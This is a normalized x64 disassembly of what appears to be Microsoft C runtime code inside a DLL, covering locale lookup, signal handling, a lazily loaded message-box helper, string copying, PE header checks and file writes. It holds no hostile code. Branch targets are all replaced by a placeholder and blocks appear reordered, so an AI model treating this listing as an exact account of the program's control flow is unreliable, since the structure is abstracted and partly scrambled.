jne r-xdata
mov edx ebp
lea rcx [ r--data ]
mov rcx [ rdi + 0x140 ]
or [ rdi + 0x150 ] 0x2
mov [ rdi + 0x164 ] ebx
call sub_180023ce0
cmp eax [ rdi + 0x154 ]
jne r-xdata
mov ecx ebx
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x20 ]
and ecx 0x3ff
mov edx 0x20000001
bts ecx 0xa
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov [ rdi + 0x160 ] ebx
jmp r-xdata
lea r8 [ rdi + 0x140 ]
mov edx 0x1
mov ecx ebx
call sub_18002d3e4
test eax eax
je r-xdata
inc edx
add rcx 0x2
cmp edx 0xa
jb r-xdata
mov [ rdi + 0x160 ] ebx
jmp r-xdata
mov eax [ rdi + 0x160 ]
bts [ rdi + 0x150 ] 0x8
test eax eax
cmove eax ebx
mov [ rdi + 0x160 ] eax
cmp bx [ rcx ]
je r-xdata
or eax 0x1
mov [ rdi + 0x150 ] eax
sub_18002d744
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0xc0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xb0 ] rax
mov rbx rcx
call sub_180025c90
mov rcx rbx
mov rdi rax
call sub_18002d2c0
mov ecx [ rdi + 0x158 ]
neg ecx
lea r8 [ rsp + 0x30 ]
mov r9d 0x78
sbb edx edx
mov ecx eax
mov ebx eax
and edx 0xfffff002
add edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180030c4c
test eax eax
jne r-xdata
and [ rdi + 0x150 ] eax
mov eax 0x1
jmp r-xdata
cmp [ rdi + 0x158 ] 0x0
jne r-xdata
cmp [ rdi + 0x158 ] eax
jne r-xdata
mov rcx [ rsp + 0xb0 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xd8 ]
add rsp 0xc0
pop rdi
retn
mov eax [ rdi + 0x150 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ rdi + 0x154 ] 0x0
je r-xdata
or [ rdi + 0x150 ] 0x4
mov [ rdi + 0x160 ] ebx
mov [ rdi + 0x164 ] ebx
lea r8 [ rdi + 0x140 ]
lea edx [ rax + 0x1 ]
mov ecx ebx
call sub_18002d3e4
jmp r-xdata
mov rcx [ rdi + 0x140 ]
lea rdx [ rsp + 0x30 ]
call sub_180030c4c
test eax eax
jne r-xdata
test eax eax
je r-xdata
mov ecx ebx
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x20 ]
and ecx 0x3ff
mov edx 0x20000001
bts ecx 0xa
call [ GetLocaleInfoW@IAT ]
sub_18002d874
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call sub_180023ce0
mov rcx [ rbx + 0x8 ]
xor edx edx
cmp rax 0x3
sete dl
mov [ rbx + 0x18 ] edx
call sub_180023ce0
xor ecx ecx
cmp rax 0x3
sete cl
and [ rbx + 0x20 ] 0x0
cmp [ rbx + 0x18 ] 0x0
mov [ rbx + 0x1c ] ecx
je r-xdata
mov rax [ rbx ]
xor edx edx
mov edx 0x2
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
and [ rbx + 0x10 ] 0x0
test [ rbx + 0x10 ] 0x200
je r-xdata
mov [ rbx + 0x14 ] edx
lea rcx [ sub_18002d474 ]
mov edx 0x1
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x100
je r-xdata
inc edx
jmp r-xdata
test [ rbx + 0x10 ] 0x7
jne r-xdata
mov cl [ rax ]
inc rax
cmp cl 0x41
jl r-xdata
add rsp 0x20
pop rbx
retn
sub_18002d90c
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
call sub_180023ce0
xor edx edx
cmp rax 0x3
sete dl
mov [ rbx + 0x18 ] edx
test edx edx
je r-xdata
mov rax [ rbx ]
xor edx edx
mov edx 0x2
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
add rsp 0x20
pop rbx
retn
and [ rbx + 0x10 ] 0x0
mov [ rbx + 0x14 ] edx
lea rcx [ sub_18002d744 ]
mov edx 0x1
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x4
jne r-xdata
inc edx
jmp r-xdata
mov cl [ rax ]
inc rax
cmp cl 0x41
jl r-xdata
sub_18002d978
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x30
mov r12 r8
mov rbp rdx
mov rsi rcx
call sub_180025c90
lea rbx [ rax + 0x140 ]
test rsi rsi
jne r-xdata
lea rax [ rsi + 0x40 ]
mov [ rbx ] rsi
mov [ rbx + 0x8 ] rax
test rax rax
je r-xdata
or [ rbx + 0x10 ] 0x104
jmp r-xdata
mov rax [ rbx ]
and [ rbx + 0x10 ] 0x0
test rax rax
je r-xdata
cmp [ rax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ rbx + 0x20 ] eax
mov [ rbx + 0x24 ] eax
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
cmp [ rax ] 0x0
je r-xdata
lea r8 [ rbx + 0x8 ]
lea rcx [ r--data ]
mov edx 0x16
call sub_18002d228
xor eax eax
lea rax [ rsi + 0x80 ]
neg rsi
sbb rdi rdi
and rdi rax
je r-xdata
mov [ rbx + 0x10 ] 0x104
cmp [ rcx ] 0x0
je r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov ecx [ rbx + 0x24 ]
lea r8 [ rsp + 0x50 ]
mov r9d 0x2
mov edx 0x20001004
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
cmp [ rdi ] 0x0
je r-xdata
call sub_180023ce0
xor ecx ecx
mov edx 0x1
cmp rax 0x3
sete cl
mov [ rbx + 0x1c ] ecx
lea rcx [ sub_18002d2fc ]
call [ EnumSystemLocalesA@IAT ]
test [ rbx + 0x10 ] 0x4
jne r-xdata
mov rcx rbx
call sub_18002d90c
cmp [ rax ] 0x0
je r-xdata
mov edi [ rsp + 0x50 ]
test edi edi
jne r-xdata
lea rdx [ r--data ]
mov rcx rdi
call sub_180025410
test eax eax
je r-xdata
cmp [ rbx + 0x10 ] 0x0
je r-xdata
and [ rbx + 0x10 ] 0x0
jmp r-xdata
lea rcx [ r--data ]
mov r8 rbx
mov edx 0x40
call sub_18002d228
test eax eax
je r-xdata
mov rcx rbx
call sub_18002d874
jmp r-xdata
cmp edi 0xfde8
je r-xdata
call [ GetACP@IAT ]
lea rdx [ r--data ]
mov rcx rdi
call sub_180025410
test eax eax
jne r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
cmp [ rbx + 0x10 ] 0x0
jne r-xdata
cmp edi 0xfde9
je r-xdata
mov rcx rdi
call sub_180030c94
jmp r-xdata
mov ecx [ rbx + 0x24 ]
lea r9d [ rax + 0x2 ]
lea r8 [ rsp + 0x50 ]
mov edx 0x2000000b
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
mov rcx rbx
call sub_18002d90c
jmp r-xdata
cmp [ rax ] 0x0
je r-xdata
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi eax
mov edi [ rsp + 0x50 ]
jmp r-xdata
mov rcx rbx
call sub_18002d874
jmp r-xdata
mov ecx [ rbx + 0x20 ]
mov edx 0x1
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test rbp rbp
je r-xdata
test r12 r12
je r-xdata
movzx eax [ rbx + 0x20 ]
mov [ rbp ] ax
movzx eax [ rbx + 0x24 ]
mov [ rbp + 0x4 ] di
mov [ rbp + 0x2 ] ax
mov eax 0x1
jmp r-xdata
mov eax 0x814
cmp [ rbp ] ax
jne r-xdata
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov ecx [ rbx + 0x20 ]
mov r9d 0x40
mov r8 r12
mov edx 0x1001
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
lea r8 [ r--data ]
mov edx 0x40
mov rcx r12
call sub_180025324
test eax eax
je r-xdata
mov ecx [ rbx + 0x24 ]
lea r8 [ r12 + 0x40 ]
mov edx 0x1002
mov r9d 0x40
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180026490
int3
mov r9d 0xa
lea rdx [ r12 + 0x80 ]
mov ecx edi
lea r8d [ r9 + 0x6 ]
call sub_1800252a0
sub_18002dc58
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x20 ] rax
mov al [ rdx ]
xor r11d r11d
mov r10 rdx
mov [ rsp ] r11
mov [ rsp + 0x8 ] r11
mov [ rsp + 0x10 ] r11
mov [ rsp + 0x18 ] r11
mov r9 rcx
jmp r-xdata
test al al
jne r-xdata
movzx r8d al
movzx eax al
mov edx 0x1
and eax 0x7
shr r8 0x3
mov cl al
shl dl cl
or [ rsp + r8 ] dl
inc r10
mov al [ r10 ]
jmp r-xdata
mov r8b [ r9 ]
test r8b r8b
jne r-xdata
movzx ecx r8b
movzx eax r8b
mov edx 0x1
and ecx 0x7
shr rax 0x3
shl edx cl
test [ rsp + rax ] dl
jne r-xdata
xor eax eax
mov rax r9
jmp r-xdata
inc r9
mov rcx [ rsp + 0x20 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x38
retn
sub_18002dd20
sub rsp 0x28
mov [ rsp + 0x30 ] rcx
mov [ rsp + 0x38 ] rdx
mov [ rsp + 0x40 ] r8d
mov rdx [ rdx ]
mov rax rcx
call sub_18002ddc0
call rax
call sub_18002ddf0
mov rcx rax
mov rdx [ rsp + 0x38 ]
mov rdx [ rdx ]
mov r8d 0x2
call sub_18002ddc0
add rsp 0x28
retn
sub_18002de24
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov ebx ecx
xor edi edi
mov [ rsp + 0x60 ] edi
xor esi esi
mov edx ecx
sub edx 0x2
je r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
sub edx 0x2
je r-xdata
test r13 r13
jne r-xdata
xor eax eax
jmp r-xdata
call sub_180025c0c
mov rsi rax
test rax rax
jne r-xdata
sub edx 0x2
je r-xdata
test edi edi
je r-xdata
lea ecx [ r13 + 0x3 ]
call sub_1800268b4
int3
mov rbx [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov rdx [ rax + 0xa0 ]
mov rcx rdx
movsxd r8 [ r--data ]
or eax 0xffffffff
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x2
je r-xdata
cmp ebx 0x8
je r-xdata
xor ecx ecx
call sub_18002d0a8
nop
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jae r-xdata
add rcx 0x10
mov rax r8
shl rax 0x4
add rax rdx
cmp rcx rax
jb r-xdata
mov edi 0x1
mov [ rsp + 0x60 ] edi
call [ DecodePointer@IAT ]
mov r13 rax
sub edx 0x3
je r-xdata
mov r15 [ rsi + 0xa8 ]
mov [ rsp + 0x28 ] r15
and [ rsi + 0xa8 ] 0x0
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
xor ecx ecx
cmp [ rcx + 0x4 ] ebx
je r-xdata
cmp [ rcx + 0x4 ] ebx
je r-xdata
sub edx 0x4
je r-xdata
mov r14d [ rsp + 0x60 ]
mov r14d [ rsi + 0xb0 ]
mov [ rsi + 0xb0 ] 0x8c
jmp r-xdata
cmp ebx 0x4
je r-xdata
cmp r13 0x1
jne r-xdata
lea r12 [ rcx + 0x8 ]
mov r13 [ r12 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
sub edx 0x6
je r-xdata
call EncodePointer
mov [ r12 ] rax
mov ecx [ r--data ]
mov edx ecx
mov [ rsp + 0x20 ] ecx
cmp ebx 0x8
jne r-xdata
mov r15 [ rsp + 0x28 ]
jmp r-xdata
lea r12 [ rw-data ]
mov rcx [ rw-data ]
jmp r-xdata
dec edx
je r-xdata
mov edi 0x8
cmp ebx edi
jne r-xdata
xor ecx ecx
call sub_18002cfa8
test edi edi
je r-xdata
movsxd rcx edx
add rcx rcx
mov rax [ rsi + 0xa0 ]
and [ rax + rcx * 8 + 0x8 ] 0x0
inc edx
mov [ rsp + 0x20 ] edx
mov ecx [ r--data ]
jmp r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
jmp r-xdata
mov ecx ebx
call r13
mov edx [ rsi + 0xb0 ]
mov ecx edi
call r13
jmp r-xdata
mov eax [ r--data ]
add ecx eax
cmp edx ecx
jge r-xdata
mov [ rsi + 0xa8 ] r15
cmp ebx edi
jne r-xdata
cmp ebx 0xb
je r-xdata
cmp ebx edi
je r-xdata
mov [ rsi + 0xb0 ] r14d
jmp r-xdata
cmp ebx 0x4
jne r-xdata
sub_18002e058
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov ebp r8d
mov r14 rdx
mov r13 rcx
call EncodePointer
xor ebx ebx
cmp [ rw-data ] rbx
mov rdi rax
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov rcx rax
call [ DecodePointer@IAT ]
mov rcx [ rw-data ]
mov rsi rax
call [ DecodePointer@IAT ]
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r14
mov rdx r13
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x50
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov r9d 0xc
lea r8 [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x40 ] 0x1
jne r-xdata
sub_18002e260
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_180022de4
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bx
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bx
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bx
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
movzx eax [ r10 ]
mov [ r11 + r10 ] ax
add r10 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ r10 + r11 ]
mov [ r11 ] ax
add r11 0x2
test ax ax
je r-xdata
mov [ rcx ] bx
call sub_180022de4
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx * 2 - 0x2 ] bx
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_180026534
mov eax ebx
sub_18002e34c
sub rsp 0x28
test ecx ecx
js r-xdata
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x28
retn
mov eax [ rw-data ]
jmp r-xdata
sub_18002e38c
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov rax [ rcx ]
mov r13d r8d
mov r14d edx
mov r12d [ rax + 0x4 ]
mov r15 r9
xor r8d r8d
xor r9d r9d
mov edx r13d
mov ecx r14d
xor edi edi
call [ GetLocaleInfoW@IAT ]
movsxd rsi eax
test eax eax
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_1800212e0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d esi
mov r8 rbx
mov edx r13d
mov ecx r14d
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x60 ]
or r9d 0xffffffff
xor edx edx
mov [ rsp + 0x38 ] rdi
mov r8 rbx
mov ecx r12d
mov [ rsp + 0x30 ] rdi
test eax eax
jne r-xdata
call sub_1800213d4
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_18002094c
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r15
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18002b220
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
call [ WideCharToMultiByte@IAT ]
mov edi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_18002e4e4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x30 ]
mov rbx r9
mov edi r8d
call sub_1800221bc
mov r11d [ rsp + 0x80 ]
lea rcx [ rsp + 0x30 ]
mov r9 rbx
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] r11d
call sub_18002e38c
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18002e550
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_18002e580
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_18002e5d0
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_18002e550
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_18002e580
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_18002e61c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_180030ee8
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_180022de4
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_180022e24
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_18002e6b4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_180022e04
and [ rax ] 0x0
call sub_180022de4
mov [ rax ] 0x9
jmp r-xdata
call sub_180022e04
and [ rax ] 0x0
call sub_180022de4
mov [ rax ] 0x9
call sub_180026534
cmp edi [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180030f5c
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_180022de4
mov [ rax ] 0x9
call sub_180022e04
and [ rax ] 0x0
or rbx 0xffffffffffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_18002e61c
mov rbx rax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_180031004
mov rax rbx
jmp r-xdata
sub_18002e798
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1a30 ]
mov eax 0x1b30
call sub_18002b220
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1a20 ] rax
xor edi edi
mov r14d r8d
mov r13 rdx
and [ rsp + 0x44 ] edi
movsxd rbx ecx
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r12 rbx
lea rax [ rw-data ]
sar r12 0x5
and r15d 0x1f
mov rcx [ rax + r12 * 8 ]
mov [ rsp + 0x50 ] r12
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
mov [ rsp + 0x60 ] r15
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_180022e04
and [ rax ] edi
call sub_180022de4
mov [ rax ] 0x16
call sub_180026534
mov rcx [ rbp + 0x1a20 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_18002f02c
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_18002e61c
lea rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r12 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r14d
mov rdx r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov r12 r13
test sil sil
jne r-xdata
call sub_180025c90
xor ebx ebx
lea rdx [ rsp + 0x5c ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r12 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r14d r14d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r14d r14d
je r-xdata
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rax [ rcx + rax * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x58 ] edi
mov rbx r13
mov [ rsp + 0x5c ] eax
test r14d r14d
je r-xdata
test sil sil
je r-xdata
sub edi [ rsp + 0x44 ]
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_180022de4
mov [ rax ] 0x1c
call sub_180022e04
and [ rax ] 0x0
jmp r-xdata
cmp [ r13 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ r12 ]
inc r12
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
test sil sil
jne r-xdata
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rbp + 0x620 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r15d eax
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r15d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov cl [ rbx ]
xor eax eax
cmp cl 0xa
sete al
mov [ rsp + 0x4c ] eax
lea rax [ rw-data ]
mov rdx [ rax + r12 * 8 ]
cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_180022e24
jmp r-xdata
call sub_180022de4
mov [ rax ] 0x9
call sub_180022e04
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
